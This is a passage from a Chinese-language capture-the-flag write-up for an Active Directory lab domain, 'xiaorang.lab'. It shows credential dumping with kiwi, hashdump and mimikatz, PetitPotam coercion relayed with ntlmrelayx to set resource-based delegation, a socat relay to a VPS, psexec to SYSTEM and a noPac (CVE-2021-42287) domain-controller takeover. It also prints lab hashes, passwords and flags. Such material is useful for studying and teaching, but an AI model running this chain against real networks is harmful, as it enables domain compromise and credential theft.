 <span class="token comment">#######:  #######:  .######.  .######.    ##      ########  ##    ##  .####### </span>
 <span class="token builtin class-name">.</span><span class="token comment">#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:## </span>
           <span class="token comment">##                                                           #.  :## </span>
           <span class="token comment">##                                                           ######  </span>
           <span class="token comment">##                                                           :####:  </span>


flag02: flag<span class="token punctuation">&#123;</span>28f19e26-4c48-4dd6-95f3-8eac6b983452<span class="token punctuation">&#125;</span></code></pre>
<h2 id="PetitPoatam强制认证"><a href="#PetitPoatam强制认证" class="headerlink" title="PetitPoatam强制认证"></a>PetitPoatam强制认证</h2><p>dump一下哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> load kiwi
meterpreter <span class="token operator">></span> creds_all
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Running as SYSTEM
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Retrieving all credentials
msv credentials
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  8cb85a549133ae4be2e3810ab5a26ccc  8619a3fb254d842f8dbcdbd508124414a
                                                         168357f
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0ed
                                                         b269a6f
yangmei      XIAORANG.LAB  xrihGHgoNZQ
meterpreter <span class="token operator">></span> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>

<p>两个域内用户<code>XR-DESKTOP$</code> <code>yangmei</code>,使用<code>yangmei</code>进行域内信息收集,先通过rdp远程进入桌面操作<br><img src="https://s1.imagehub.cc/images/2025/02/11/2676b5bad228ec95a053c820cf768e62.png" alt="image" loading="lazy"></p>
<p>使用<code>PetitPotam</code>触发NTLM身份认证进行NTLM中继攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> crackmapexec smb  <span class="token number">172.22</span>.11.26 <span class="token parameter variable">-u</span> yangmei <span class="token parameter variable">-p</span> xrihGHgoNZQ <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-M</span> Webdav
SMB         <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> xiaorang.lab<span class="token punctuation">\</span>yangmei:xrihGHgoNZQ 
WEBDAV      <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      WebClient Service enabled on: <span class="token number">172.22</span>.11.26</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> crackmapexec smb  <span class="token number">172.22</span>.11.26 <span class="token parameter variable">-u</span> yangmei <span class="token parameter variable">-p</span> xrihGHgoNZQ <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-M</span> PetitPotam  <span class="token punctuation">[</span><span class="token number">18</span>:31:44<span class="token punctuation">]</span>
SMB         <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">18362</span> x64 <span class="token punctuation">(</span>name:XR-LCM3AE8B<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:xiaorang.lab<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> xiaorang.lab<span class="token punctuation">\</span>yangmei:xrihGHgoNZQ 
PETITPOT<span class="token punctuation">..</span>. <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      VULNERABLE
PETITPOT<span class="token punctuation">..</span>. <span class="token number">172.22</span>.11.26    <span class="token number">445</span>    XR-LCM3AE8B      Next step: https://github.com/topotam/PetitPotam</code></pre>
<p>172.22.11.26存在webdav服务和petitpotam<br>1.使用petitpotam强制172.22.11.26访问http服务<br>2.172.22.11.16 NTLM终极到LDAP<br>3.获取到172.22.11.16机器账号</p>
<p>先将172.22.11.76 web服务器的80端口转发到vps的80端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:/tmp<span class="token comment"># socat TCP-LISTEN:80,fork,reuseaddr TCP:101.43.121.110:80</span></code></pre>
<p>然后使用<code>PetitPotam</code>触发目标到http中级服务获取到它的Net-NTLM V2 Hash<br>利用<code>xr-desktop$</code>作为恶意机器账户设置RBCD<br>先设置RBCD</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@VM-4-13-ubuntu:~/impacket-master/examples<span class="token comment"># proxychains4 -q ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access</span>
Impacket v0.11.0 - Copyright <span class="token number">2023</span> Fortra

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client SMB loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client MSSQL loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client HTTPS loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client HTTP loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client DCSYNC loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client RPC loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client IMAPS loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client IMAP loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client LDAP loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client LDAPS loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol Client SMTP loaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running <span class="token keyword">in</span> relay mode to single <span class="token function">host</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up SMB Server
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up HTTP Server on port <span class="token number">80</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up WCF Server
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up RAW Server on port <span class="token number">6666</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Servers started, waiting <span class="token keyword">for</span> connections
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Connection from <span class="token number">39.99</span>.154.27 controlled, attacking target ldap://172.22.11.6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Authenticating against ldap://172.22.11.6 as XIAORANG/XR-LCM3AE8B$ SUCCEED
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enumerating relayed user's privileges. This may take a <span class="token keyword">while</span> on large domains
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Connection from <span class="token number">39.99</span>.154.27 controlled, but there are no <span class="token function">more</span> targets left<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Delegation rights modified succesfully<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> xr-desktop$ can now impersonate <span class="token function">users</span> on XR-LCM3AE8B$ via S4U2Proxy</code></pre>
<p>然后强制认证</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> python PetitPotam.py <span class="token parameter variable">-u</span> yangmei <span class="token parameter variable">-p</span> xrihGHgoNZQ <span class="token parameter variable">-d</span> xiaorang.lab ubuntu@80/webdav <span class="token number">172.22</span>.11.26
/root/PetitPotam.py:20: SyntaxWarning: invalid escape sequence <span class="token string">'\ '</span>
  show_banner <span class="token operator">=</span> <span class="token string">''</span>'

                                                                                               
              ___            _        _      _        ___            _                     
             <span class="token operator">|</span> _ <span class="token punctuation">\</span>   ___    <span class="token operator">|</span> <span class="token operator">|</span>_     <span class="token punctuation">(</span>_<span class="token punctuation">)</span>    <span class="token operator">|</span> <span class="token operator">|</span>_     <span class="token operator">|</span> _ <span class="token punctuation">\</span>   ___    <span class="token operator">|</span> <span class="token operator">|</span>_    __ _    _ __   
             <span class="token operator">|</span>  _/  / -_<span class="token punctuation">)</span>   <span class="token operator">|</span>  _<span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span>    <span class="token operator">|</span>  _<span class="token operator">|</span>    <span class="token operator">|</span>  _/  / _ <span class="token punctuation">\</span>   <span class="token operator">|</span>  _<span class="token operator">|</span>  / _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>  <span class="token operator">|</span> '  <span class="token punctuation">\</span>  
            _<span class="token operator">|</span>_<span class="token operator">|</span>_   <span class="token punctuation">\</span>___<span class="token operator">|</span>   _<span class="token punctuation">\</span>__<span class="token operator">|</span>   _<span class="token operator">|</span>_<span class="token operator">|</span>_   _<span class="token punctuation">\</span>__<span class="token operator">|</span>   _<span class="token operator">|</span>_<span class="token operator">|</span>_   <span class="token punctuation">\</span>___/   _<span class="token punctuation">\</span>__<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> 
          _<span class="token operator">|</span> <span class="token string">""</span>" <span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span> <span class="token string">""</span>" <span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span> 
          "<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam <span class="token punctuation">(</span>@topotam77<span class="token punctuation">)</span>
      
                     Inspired by @tifkin_ <span class="token operator">&amp;</span> @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Connecting to ncacn_np:172.22.11.26<span class="token punctuation">[</span><span class="token punctuation">\</span>PIPE<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Connected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully bound<span class="token operator">!</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Sending EfsRpcOpenFileRaw<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got expected ERROR_BAD_NETPATH exception<span class="token operator">!</span><span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Attack worked<span class="token operator">!</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Connection from <span class="token number">39.99</span>.154.27 controlled, attacking target ldap://172.22.11.6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Authenticating against ldap://172.22.11.6 as XIAORANG/XR-LCM3AE8B$ SUCCEED
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enumerating relayed user's privileges. This may take a <span class="token keyword">while</span> on large domains
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HTTPD<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>: Connection from <span class="token number">39.99</span>.154.27 controlled, but there are no <span class="token function">more</span> targets left<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Delegation rights modified succesfully<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> xr-desktop$ can now impersonate <span class="token function">users</span> on XR-LCM3AE8B$ via S4U2Proxy</code></pre>
<p>可以看到已经成功获取了认证,然后RBCD抓白银票据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> impacket-getST <span class="token parameter variable">-spn</span> cifs/XR-LCM3AE8B.xiaorang.lab <span class="token parameter variable">-impersonate</span> administrator <span class="token parameter variable">-hashes</span> :8cb85a549133ae4be2e3810ab5a26ccc  xiaorang.lab/XR-Desktop<span class="token punctuation">\</span>$ -dc-ip <span class="token number">172.22</span>.11.6
Impacket v0.12.0.dev1 - Copyright <span class="token number">2023</span> Fortra

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> CCache <span class="token function">file</span> is not found. Skipping<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting TGT <span class="token keyword">for</span> user
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:378: DeprecationWarning: datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated and scheduled <span class="token keyword">for</span> <span class="token for-or-select variable">removal</span> <span class="token keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="token keyword">in</span> UTC: datetime.datetime.now<span class="token punctuation">(</span>datetime.UTC<span class="token punctuation">)</span>.
  now <span class="token operator">=</span> datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span>
/usr/share/doc/python3-impacket/examples/getST.py:475: DeprecationWarning: datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated and scheduled <span class="token keyword">for</span> <span class="token for-or-select variable">removal</span> <span class="token keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="token keyword">in</span> UTC: datetime.datetime.now<span class="token punctuation">(</span>datetime.UTC<span class="token punctuation">)</span>.
  now <span class="token operator">=</span> datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> + datetime.timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:605: DeprecationWarning: datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated and scheduled <span class="token keyword">for</span> <span class="token for-or-select variable">removal</span> <span class="token keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="token keyword">in</span> UTC: datetime.datetime.now<span class="token punctuation">(</span>datetime.UTC<span class="token punctuation">)</span>.
  now <span class="token operator">=</span> datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span>
/usr/share/doc/python3-impacket/examples/getST.py:657: DeprecationWarning: datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated and scheduled <span class="token keyword">for</span> <span class="token for-or-select variable">removal</span> <span class="token keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="token keyword">in</span> UTC: datetime.datetime.now<span class="token punctuation">(</span>datetime.UTC<span class="token punctuation">)</span>.
  now <span class="token operator">=</span> datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> + datetime.timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting S4U2Proxy
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saving ticket <span class="token keyword">in</span> administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">tail</span> <span class="token parameter variable">-1</span> /etc/hosts                                                                                         <span class="token punctuation">[</span><span class="token number">19</span>:20:21<span class="token punctuation">]</span>
<span class="token number">172.22</span>.11.26 XR-LCM3AE8B.xiaorang.lab</code></pre>
<p>根据ST直接连psexec</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab <span class="token parameter variable">-k</span> -no-pass -target-ip <span class="token number">172.22</span>.11.26
root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache                          <span class="token punctuation">[</span><span class="token number">19</span>:21:38<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab <span class="token parameter variable">-k</span> -no-pass -target-ip <span class="token number">172.22</span>.11.26
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting shares on <span class="token number">172.22</span>.11.26<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found writable share ADMIN$
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading <span class="token function">file</span> bGpwkQjV.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening SVCManager on <span class="token number">172.22</span>.11.26<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token function">service</span> WnQR on <span class="token number">172.22</span>.11.26<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> WnQR<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>whoami
nt authority<span class="token punctuation">\</span>system</code></pre>
<p>拿下26这台机器</p>
<h2 id="nopac"><a href="#nopac" class="headerlink" title="nopac"></a>nopac</h2><pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>flag<span class="token operator">></span>type flag03.txt
   ___     _ __                      __     _              __ _  
  / __<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token string">'_ \   ___     ___      / _|   (_)    _ _     / _` | 
  \__ \   | .__/  / _ \   / _ \    |  _|   | |   | '</span> <span class="token punctuation">\</span>    <span class="token punctuation">\</span>__, <span class="token operator">|</span> 
  <span class="token operator">|</span>___/   <span class="token operator">|</span>_<span class="token operator">|</span>__   <span class="token punctuation">\</span>___/   <span class="token punctuation">\</span>___/   _<span class="token operator">|</span>_<span class="token operator">|</span>_   _<span class="token operator">|</span>_<span class="token operator">|</span>_  <span class="token operator">|</span>_<span class="token operator">||</span>_<span class="token operator">|</span>   <span class="token operator">|</span>___/  
_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span>_<span class="token operator">|</span><span class="token string">""</span>"<span class="token string">""</span><span class="token operator">|</span> 
<span class="token string">"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-'"</span><span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span> 

flag03: flag<span class="token punctuation">&#123;</span>f15c5f33-1d6f-4266-925d-e73ebbad5c30<span class="token punctuation">&#125;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>flag<span class="token operator">></span>net group /domain



-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*MA_Admin
*Protected Users
*Read-only Domain Controllers
*Schema Admins</code></pre>
<p>存在<code>MA_Admin</code>组，MA_Admin 组对computer 能够创建对象,先创建一个管理员用户进行rdp在桌面操作<br>mimikatzdump哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">""</span>privilege::debug<span class="token string">""</span> <span class="token string">""</span>log sekurlsa::logonpasswords full<span class="token string">""</span> <span class="token builtin class-name">exit</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
        * Username <span class="token builtin class-name">:</span> zhanghui
        * Domain   <span class="token builtin class-name">:</span> XIAORANG
        * NTLM     <span class="token builtin class-name">:</span> 1232126b24cdf8c9bd2f788a9d7c7ed1
        * SHA1     <span class="token builtin class-name">:</span> f3b66ff457185cdf5df6d0a085dd8935e226ba65
        * DPAPI    <span class="token builtin class-name">:</span> 4bfe751ae03dc1517cfb688adc506154</code></pre>
<p>抓到zhanghui的ntlm,而它就是MA_Admin组的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>net user zhanghui /domain
*Domain Users         *MA_Admin  </code></pre>
<p>打CVE-2021-42287获取DC的ST<br><a target="_blank" rel="noopener" href="https://cloud.tencent.cn/developer/article/2097964">https://cloud.tencent.cn/developer/article/2097964</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/noPac<span class="token punctuation">]</span> git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ➜  proxychains4 <span class="token parameter variable">-q</span> python noPac.py xiaorang.lab/zhanghui <span class="token parameter variable">-hashes</span> :1232126b24cdf8c9bd2f788a9d7c7ed1 -dc-ip <span class="token number">172.22</span>.11.6 <span class="token parameter variable">--impersonate</span> Administrator -create-child -use-ldap <span class="token parameter variable">-shell</span>

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Current ms-DS-MachineAccountQuota <span class="token operator">=</span> <span class="token number">0</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Selected Target xiaorang-dc.xiaorang.lab
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> will try to impersonate Administrator
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Adding Computer Account <span class="token string">"WIN-0ECBTAWQOVL$"</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> MachineAccount <span class="token string">"WIN-0ECBTAWQOVL$"</span> password <span class="token operator">=</span> 0w6VIBFT43hx
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Successfully added machine account WIN-0ECBTAWQOVL$ with password 0w6VIBFT43hx.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WIN-0ECBTAWQOVL$ object <span class="token operator">=</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>WIN-0ECBTAWQOVL,CN<span class="token operator">=</span>Computers,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WIN-0ECBTAWQOVL$ sAMAccountName <span class="token operator">==</span> xiaorang-dc
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saving a DC<span class="token string">'s ticket in xiaorang-dc.ccache
[*] Reseting the machine account to WIN-0ECBTAWQOVL$
[*] Restored WIN-0ECBTAWQOVL$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*] Saving a user'</span>s ticket <span class="token keyword">in</span> Administrator.ccache
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Rename ccache to Administrator_xiaorang-dc.xiaorang.lab.ccache
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Attempting to del a computer with the name: WIN-0ECBTAWQOVL$
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Delete computer WIN-0ECBTAWQOVL$ successfully<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Pls <span class="token function">make</span> sure your choice <span class="token function">hostname</span> and the -dc-ip are same machine <span class="token operator">!</span><span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploiting<span class="token punctuation">..</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Launching semi-interactive shell - Careful what you execute
C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>whoami
nt authority<span class="token punctuation">\</span>system</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>type C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag04.txt
<span class="token number">8</span><span class="token string">""</span>"<span class="token string">"8                                       
8      eeeee eeeee eeeee eeee e  eeeee eeeee 
8eeeee 8   8 8  88 8  88 8    8  8   8 8   8 
    88 8eee8 8   8 8   8 8eee 8e 8e  8 8e    
e   88 88    8   8 8   8 88   88 88  8 88 "</span><span class="token number">8</span> 
8eee88 <span class="token number">88</span>    8eee8 8eee8 <span class="token number">88</span>   <span class="token number">88</span> <span class="token number">88</span>  <span class="token number">8</span> 88ee8 

You successfully got the last flag.

flag04: flag<span class="token punctuation">&#123;</span>f4ef40a3-64f4-489a-83e6-05ae4f16a9e7<span class="token punctuation">&#125;</span></code></pre>













